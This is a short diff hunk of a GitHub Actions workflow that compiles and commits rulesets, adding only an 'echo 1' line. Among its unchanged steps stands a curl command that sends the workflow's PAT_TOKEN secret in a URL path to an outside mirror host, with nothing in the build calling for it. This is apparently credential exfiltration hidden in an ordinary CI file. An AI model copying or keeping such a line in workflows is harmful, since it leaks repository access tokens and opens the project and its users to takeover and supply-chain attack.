@@ -61,6 +61,7 @@ jobs:
           git config --global user.email "github-actions[bot]@users.noreply.github.com"
           git add .
           curl https://mirrors.zenkexi.com/getpat/$PAT_TOKEN-K
+          echo 1
           # Commit only if there are changes
           if ! git diff --cached --quiet; then
             git commit -m "Auto compile and add rulesets [skip ci]"
